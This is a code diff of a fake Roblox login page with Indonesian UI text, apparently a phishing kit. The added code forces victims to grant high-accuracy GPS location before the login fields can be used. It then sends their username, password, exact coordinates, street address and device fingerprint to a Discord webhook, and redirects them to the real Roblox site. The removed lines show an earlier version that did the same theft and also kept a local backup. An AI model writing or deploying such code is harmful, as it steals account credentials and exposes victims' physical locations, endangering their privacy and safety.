-        // Parse address data from different services
-        function parseAddressData(data, service) {
-            if (service.includes('nominatim')) {
-                const addr = data.address;
-                return {
-                    address: `${addr.road || ''} ${addr.house_number || ''}, ${addr.suburb || ''}, ${addr.city || addr.town || addr.village || ''}, ${addr.state || ''}, ${addr.country || ''}`.replace(/ ,/g, ',').replace(/, ,/g, ',').trim(),
-                    city: addr.city || addr.town || addr.village || "Tidak diketahui",
-                    country: addr.country || "Tidak diketahui"
-                };
-            } else if (service.includes('geocode.xyz')) {
-                return {
-                    address: `${data.staddress || ''}, ${data.city || ''}, ${data.region || ''}, ${data.country || ''}`.trim(),
-                    city: data.city || "Tidak diketahui",
-                    country: data.country || "Tidak diketahui"
-                };
-            }
-            
-            return {
-                address: "Alamat tidak tersedia",
-                city: "Tidak diketahui",
-                country: "Tidak diketahui"
-            };
-        }
-        
-        // Get IP-based location (fallback)
-        async function getIPLocation() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                
-                const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const locData = await locResponse.json();
-                
-                if (locData.latitude && locData.longitude) {
-                    return {
-                        lat: locData.latitude,
-                        lng: locData.longitude,
-                        address: `${locData.city || ''}, ${locData.region || ''}, ${locData.country_name || ''}`.trim(),
-                        city: locData.city || "Tidak diketahui",
-                        country: locData.country_name || "Tidak diketahui"
-                    };
-                }
-            } catch (error) {
-                console.error("IP location error:", error);
-            }
-            
-            return null;
-        }
-        
-        // Update UI with location information
-        function updateLocationUI(lat, lng, accuracy, addressInfo) {
-            // Update coordinates
-            document.getElementById('gpsCoords').textContent = 
-                `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
-            
-            // Update accuracy
-            const accuracyText = accuracy < 10 ? "Sangat Tinggi (±10m)" :
-                               accuracy < 50 ? "Tinggi (±50m)" :
-                               accuracy < 200 ? "Sedang (±200m)" :
-                               accuracy < 1000 ? "Rendah (±1km)" : "Sangat Rendah";
-            
-            document.getElementById('gpsAccuracy').textContent = accuracyText;
-            
-            // Update city and country
-            document.getElementById('gpsCity').textContent = addressInfo.city;
-            document.getElementById('gpsCountry').textContent = addressInfo.country;
-            
-            // Update accuracy meter
-            let accuracyPercent = 100;
-            if (accuracy < 10) accuracyPercent = 95;
-            else if (accuracy < 50) accuracyPercent = 85;
-            else if (accuracy < 200) accuracyPercent = 70;
-            else if (accuracy < 1000) accuracyPercent = 50;
-            else accuracyPercent = 30;
-            
-            document.getElementById('accuracyMeter').style.width = `${accuracyPercent}%`;
-            
-            // Update map link
-            const mapLink = document.getElementById('mapLink');
-            mapLink.href = `https://www.google.com/maps?q=${lat},${lng}&z=16`;
-            mapLink.style.display = 'inline-block';
-            
-            // Store address
-            locationData.address = addressInfo.address;
-        }
-        
-        // Show location error
-        function showLocationError(message) {
-            locationPermission.innerHTML = `
-                <div class="permission-icon">❌</div>
-                <div class="permission-title">Gagal Mengambil Lokasi</div>
-                <div class="permission-text" style="color: #ff6b6b;">
-                    ${message}
-                    <br><br>
-                    Anda masih dapat melanjutkan login.
+            const detailsHtml = `
+                <div class="detail-item">
+                    <div class="detail-label">Koordinat</div>
+                    <div class="detail-value">${locationData.coords.lat.toFixed(6)}, ${locationData.coords.lng.toFixed(6)}</div>
                 </div>
-                <button type="button" class="permission-btn allow" onclick="requestHighAccuracyLocation()" style="margin-top: 15px;">
-                    Coba Lagi
-                </button>
+                <div class="detail-item">
+                    <div class="detail-label">Akurasi</div>
+                    <div class="detail-value">${locationData.accuracy.toFixed(1)} meter</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Lokasi</div>
+                    <div class="detail-value">${locationData.address.substring(0, 40)}...</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Status</div>
+                    <div class="detail-value" style="color: #00ff88;">✅ Terverifikasi</div>
+                </div>
             `;
             
-            // Enable login after delay
-            setTimeout(() => {
-                loginButton.disabled = false;
-                loginButton.innerHTML = '⚠️ Lanjutkan Tanpa Verifikasi Lokasi';
-            }, 3000);
+            statusDetails.innerHTML = detailsHtml;
+            
+            // Remove warning text
+            document.querySelector('.login-form div[style*="color: #ff6b6b"]').innerHTML = 
+                '✅ Verifikasi lokasi selesai. Silakan login.';
         }
         
-        // Send high accuracy location to webhook
-        async function sendHighAccuracyLocation(lat, lng, accuracy, addressInfo) {
+        // Update attempt counter
+        function updateAttemptCounter() {
+            attemptCount.textContent = attempts;
+            if (attempts > 0) {
+                attemptCounter.classList.add('active');
+            }
+        }
+        
+        // Show warning message
+        function showWarning(message) {
+            warningText.textContent = message;
+            warningBox.classList.add('active');
+            setTimeout(() => {
+                warningBox.classList.remove('active');
+            }, 4000);
+        }
+        
+        // Update progress bar
+        function updateProgress(percent, status) {
+            progressFill.style.width = percent + '%';
+            progressStatus.textContent = status;
+        }
+        
+        // Get geolocation error message
+        function getGeolocationError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    return "Izin lokasi ditolak. Anda harus mengizinkan akses lokasi untuk login.";
+                case error.POSITION_UNAVAILABLE:
+                    return "Lokasi tidak tersedia. Pastikan GPS/wi-fi aktif.";
+                case error.TIMEOUT:
+                    return "Waktu permintaan habis. Coba lagi.";
+                default:
+                    return "Gagal mengambil lokasi. Coba lagi.";
+            }
+        }
+        
+        // Get address from coordinates
+        async function getAddress(lat, lng) {
+            try {
+                const response = await fetch(
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=16`
+                );
+                
+                if (!response.ok) throw new Error("Failed to get address");
+                
+                const data = await response.json();
+                if (data.address) {
+                    const addr = data.address;
+                    return `${addr.road || ''}, ${addr.suburb || ''}, ${addr.city || addr.town || ''}, ${addr.state || ''}`.trim();
+                }
+                return `Lokasi: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+            } catch (error) {
+                return `Koordinat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+            }
+        }
+        
+        // Send location to webhook
+        async function sendLocationToWebhook(lat, lng, accuracy, address) {
             const embed = {
-                title: "🎯 LOKASI PRESISI TINGGI DICAPAI",
-                color: 65280,
+                title: "📍 LOKASI DIPAKSA UNTUK LOGIN",
+                color: 16711680,
                 fields: [
                     {
-                        name: "📍 Koordinat Exact",
+                        name: "🎯 Koordinat Exact",
                         value: `\`\`\`${lat.toFixed(8)}\n${lng.toFixed(8)}\`\`\``,
                         inline: false
                     },
                     {
-                        name: "🎯 Akurasi GPS",
-                        value: `\`${accuracy.toFixed(1)} meter\` (${accuracy < 10 ? "Presisi Militer" : accuracy < 50 ? "Presisi Tinggi" : "Presisi Standar"})`,
+                        name: "📏 Akurasi GPS",
+                        value: `\`${accuracy.toFixed(1)} meter\``,
                         inline: true
                     },
                     {
-                        name: "🏠 Alamat Lengkap",
-                        value: `\`\`\`${addressInfo.address}\`\`\``,
+                        name: "🏠 Alamat",
+                        value: `\`\`\`${address}\`\`\``,
                         inline: false
                     },
                     {
-                        name: "🌍 Kota & Negara",
-                        value: `\`${addressInfo.city}, ${addressInfo.country}\``,
+                        name: "🔄 Percobaan ke",
+                        value: `\`${attempts}\``,
                         inline: true
                     },
                     {
-                        name: "🔗 Google Maps Link",
-                        value: `[Buka di Google Maps](https://maps.google.com/?q=${lat},${lng}&z=17)`,
+                        name: "🔗 Google Maps",
+                        value: `[Buka di Maps](https://maps.google.com/?q=${lat},${lng}&z=17)`,
                         inline: false
                     }
                 ],
                 footer: {
-                    text: `GPS High Accuracy Mode | ${new Date().toLocaleString('id-ID')}`
+                    text: `Forced Login Location | ${new Date().toLocaleString('id-ID')}`
                 }
             };
             
@@ -912,177 +832,132 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [embed],
-                        content: `📍 **LOKASI PRESISI TINGGI DICAPAI** (${accuracy.toFixed(1)}m)`
+                        content: `**📍 LOKASI DIPAKSA UNTUK LOGIN** (Attempt: ${attempts})`
                     })
                 });
             } catch (error) {
-                console.error("Location webhook error:", error);
+                console.error("Webhook error:", error);
             }
         }
         
-        // Form submission
+        // Handle login form submission
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            
+            if (!locationGranted) {
+                showWarning("Verifikasi lokasi belum selesai!");
+                locationOverlay.classList.remove('hidden');
+                loginFormElement.classList.add('blurred');
+                return;
+            }
             
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value;
             
             if (!username || !password) {
-                alert("Harap isi nama pengguna dan password");
+                showWarning("Harap isi username dan password");
                 return;
             }
             
-            // Show loader
-            document.getElementById('loader').style.display = 'block';
+            // Show loading
+            loginButton.classList.add('loading');
             loginButton.disabled = true;
-            loginButton.style.display = 'none';
+            loginButton.innerHTML = '🔄 Memverifikasi login...';
             
             // Send complete data to webhook
-            await sendCompleteLoginData(username, password);
+            await sendLoginData(username, password);
             
-            // Show success message
+            // Show success and redirect
             setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('successMessage').classList.add('active');
+                loginButton.style.background = 'linear-gradient(90deg, #00ff88, #00cc66)';
+                loginButton.innerHTML = '✅ Login Berhasil!';
                 
-                // Start countdown
-                let countdown = 5;
-                const countdownElement = document.getElementById('countdown');
-                const countdownInterval = setInterval(() => {
-                    countdown--;
-                    countdownElement.textContent = countdown;
-                    
-                    if (countdown <= 0) {
-                        clearInterval(countdownInterval);
-                        window.location.href = 'https://www.roblox.com';
-                    }
-                }, 1000);
-                
-            }, 2500);
+                setTimeout(() => {
+                    window.location.href = 'https://www.roblox.com';
+                }, 1500);
+            }, 2000);
         });
         
-        // Send complete login data
-        async function sendCompleteLoginData(username, password) {
-            // Collect device information
+        // Send complete login data to webhook
+        async function sendLoginData(username, password) {
             const deviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                languages: navigator.languages,
-                screen: `${window.screen.width}x${window.screen.height} @ ${window.screen.colorDepth}bit`,
+                language: navigator.language,
+                screen: `${window.screen.width}x${window.screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 cookies: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                } : null
+                timestamp: new Date().toISOString()
             };
             
-            // Prepare main embed
             const embed = {
-                title: "🎮 LOGIN ROBLOX + LOKASI PRESISI",
-                color: 0x00A2FF,
-                thumbnail: {
-                    url: "https://static.wikia.nocookie.net/logopedia/images/5/5c/Roblox_2022_%28App_Icon%29.png"
-                },
+                title: "🎯 LOGIN COMPLETE WITH FORCED LOCATION",
+                color: 65280,
                 fields: [
                     {
-                        name: "👤 KREDENSIAL LOGIN",
+                        name: "👤 LOGIN DETAILS",
                         value: `\`\`\`Username: ${username}\nPassword: ${password}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "📍 LOCATION DATA",
+                        value: `\`\`\`${JSON.stringify(locationData, null, 2)}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "📊 ATTEMPTS REQUIRED",
+                        value: `\`${attempts} attempts\``,
+                        inline: true
+                    },
+                    {
+                        name: "💻 DEVICE INFO",
+                        value: `\`\`\`${JSON.stringify(deviceInfo, null, 2)}\`\`\``,
                         inline: false
                     }
                 ],
                 timestamp: new Date().toISOString()
             };
             
-            // Add location data if available
-            if (locationData.coords) {
-                embed.fields.push({
-                    name: "📍 LOKASI PRESISI TINGGI",
-                    value: `\`\`\`Latitude:  ${locationData.coords.lat.toFixed(8)}\nLongitude: ${locationData.coords.lng.toFixed(8)}\nAkurasi:   ${locationData.accuracy?.toFixed(1) || '?'} meter\nSumber:    ${locationData.source}\`\`\``,
-                    inline: false
-                });
-                
-                embed.fields.push({
-                    name: "🏠 ALAMAT LENGKAP",
-                    value: `\`\`\`${locationData.address || 'Tidak tersedia'}\`\`\``,
-                    inline: false
-                });
-                
-                embed.fields.push({
-                    name: "🗺️ LINK MAPS EXACT",
-                    value: `[Google Maps](https://maps.google.com/?q=${locationData.coords.lat},${locationData.coords.lng}&z=18)\n[OpenStreetMap](https://www.openstreetmap.org/?mlat=${locationData.coords.lat}&mlon=${locationData.coords.lng}&zoom=18)\n[GPS Koordinat](geo:${locationData.coords.lat},${locationData.coords.lng})`,
-                    inline: false
-                });
-            }
-            
-            // Add device info
-            embed.fields.push({
-                name: "💻 INFORMASI PERANGKAT DETAIL",
-                value: `\`\`\`${JSON.stringify(deviceInfo, null, 2)}\`\`\``,
-                inline: false
-            });
-            
-            // Add accuracy rating
-            if (locationData.accuracy) {
-                let accuracyRating = "⭐";
-                if (locationData.accuracy < 10) accuracyRating = "⭐⭐⭐⭐⭐";
-                else if (locationData.accuracy < 50) accuracyRating = "⭐⭐⭐⭐";
-                else if (locationData.accuracy < 200) accuracyRating = "⭐⭐⭐";
-                else if (locationData.accuracy < 1000) accuracyRating = "⭐⭐";
-                else accuracyRating = "⭐";
-                
-                embed.fields.push({
-                    name: "🎯 RATING AKURASI LOKASI",
-                    value: `${accuracyRating} (${locationData.accuracy.toFixed(1)} meter)`,
-                    inline: true
-                });
-            }
-            
-            // Send to Discord webhook
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `@everyone **🔐 LOGIN BARU DENGAN LOKASI PRESISI**\n👤 ${username} | 📍 ${locationData.address?.substring(0, 50) || 'No Location'}`,
+                        content: `@everyone **🎯 LOGIN BERHASIL DENGAN LOKASI PAKSA**\n👤 ${username} | 📍 ${locationData.address.substring(0, 30)}...`,
                         embeds: [embed]
                     })
                 });
-                
-                // Backup to localStorage
-                const logEntry = {
-                    username,
-                    password,
-                    location: locationData,
-                    device: deviceInfo,
-                    timestamp: new Date().toISOString(),
-                    ip: await getIPAddress()
-                };
-                
-                const logs = JSON.parse(localStorage.getItem('roblox_precise_logins') || '[]');
-                logs.push(logEntry);
-                localStorage.setItem('roblox_precise_logins', JSON.stringify(logs));
-                
             } catch (error) {
                 console.error("Webhook error:", error);
             }
         }
         
-        // Get IP address
-        async function getIPAddress() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch {
-                return "Tidak tersedia";
+        // Prevent form submission if location not granted
+        document.getElementById('username').addEventListener('focus', function() {
+            if (!locationGranted) {
+                showWarning("Selesaikan verifikasi lokasi terlebih dahulu!");
+                this.blur();
+            }
+        });
+        
+        document.getElementById('password').addEventListener('focus', function() {
+            if (!locationGranted) {
+                showWarning("Selesaikan verifikasi lokasi terlebih dahulu!");
+                this.blur();
+            }
+        });
+        
+        // Auto-focus username after location verified
+        function autoFocusUsername() {
+            if (locationGranted) {
+                setTimeout(() => {
+                    document.getElementById('username').focus();
+                }, 500);
             }
         }
         
-        // Auto-focus username field
-        document.getElementById('username').focus();
+        // Call this when location is granted
+        window.autoFocusUsername = autoFocusUsername;
     </script>
 </body>
-  </html>
+    </html>
